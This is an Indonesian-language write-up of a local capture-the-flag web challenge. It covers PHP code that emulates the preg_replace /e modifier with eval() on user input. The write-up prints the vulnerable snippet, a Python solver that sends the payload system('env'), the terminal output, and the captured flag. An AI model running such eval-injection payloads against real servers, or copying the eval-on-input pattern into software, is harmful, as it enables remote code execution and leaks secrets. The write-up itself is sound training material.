# WriteUp: Rahasia Suryo

## Overview

* **Judul:** Rahasia Suryo
* **Kategori:** Input Injection
* **Poin:** 500
* **Deskripsi:** Bisa ngga lu mengungkap rahasia Suryo?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `codex3.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Suryo]
└─$ tree
.
├── codex3.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`codex3.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/codex3:latest
    ports:
      - "1337:8080"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Suryo]
└─$ PWN=WanZKey docker compose -f codex3.yml up -d --build
[+] up 17/17
 ✔ Image ghcr.io/hengkerrusia/codex3:latest Pulled                                                                 29.5s
 ✔ Network rahasiasuryo_default Created                                                                             0.4s
 ✔ Container rahasiasuryo-web-1 Created                                                                             0.6s

```

### 2. Source Code Analysis (White Box)

Melakukan inspeksi file `index.php` di dalam container. Ditemukan logika yang mensimulasikan fitur usang PHP `preg_replace` dengan modifier `/e` (Evaluate).

**Snippet Vulnerable (`index.php`):**

```php
$pattern = $_POST['pattern'] ?? '';
$replacement = $_POST['replacement'] ?? '';
$text = $_POST['text'] ?? '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($pattern) && !empty($text)) {
    // 1. Cek apakah pattern regex diakhiri dengan modifier 'e'
    // Contoh pattern user: /something/e
    if (preg_match('/(.)([a-z]*e[a-z]*)$/', $pattern, $matches)) {
        $is_eval = true;
        // ... (Logika pembersihan pattern)
    }

    if ($is_eval) {
        // 2. VULNERABILITY: Simulasi modifier /e
        // String $replacement dieksekusi sebagai kode PHP menggunakan eval()
        $result = preg_replace_callback($clean_pattern, function($m) use ($replacement) {
            return eval("return " . $replacement . ";");
        }, $text);
    } 
    // ...
}

```

**Analisis Kerentanan:**

1. **Vulnerable Feature:** Aplikasi secara manual mengimplementasikan perilaku modifier `/e` pada regex, yang memungkinkan string *replacement* dieksekusi sebagai kode PHP.
2. **Injection Point:** Parameter POST `pattern` digunakan untuk mengaktifkan mode eval (harus diakhiri `/e`), dan parameter POST `replacement` digunakan sebagai payload kode PHP.
3. **Exploit Strategy:**
* Kirim `text`: String sembarang (misal: `pwn`).
* Kirim `pattern`: Regex yang cocok dengan teks dan memiliki modifier `e` (misal: `/pwn/e`).
* Kirim `replacement`: Kode PHP RCE (misal: `system('env')`).



### 3. Exploitation

Mengirimkan payload POST request untuk memicu eksekusi `system('env')`.

## Script Solver

Script Python untuk melakukan eksploitasi otomatis.

**File:** `exploit.py`

```python
import requests
import re

# Target URL (Port 1337)
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Payload PHP preg_replace /e Injection
    # 1. text: String target
    # 2. pattern: Regex match dengan modifier 'e' untuk trigger eval()
    # 3. replacement: Kode PHP yang akan dieksekusi
    
    data = {
        'text': 'pwn_me',           
        'pattern': '/pwn_me/e',     
        'replacement': "system('env')" 
    }
    
    print(f"[*] Sending Payload with /e modifier...")
    
    try:
        r = requests.post(URL, data=data)
        
        if r.status_code == 200:
            print("[+] Injection Successful!")
            
            # Regex Flag pwn{...}
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                print("[-] Flag regex failed.")
                print(r.text[:500]) 
        else:
            print(f"[-] Error Status: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Suryo]
└─$ python3 exploit.py
[*] Target: http://localhost:1337
[*] Sending Payload with /e modifier...
[+] Injection Successful!

[!!!] FLAG FOUND: pwn{d19a28fb3b6eced1da98b430c1a4a1e9}

```

## Flag

```
pwn{d19a28fb3b6eced1da98b430c1a4a1e9}

```
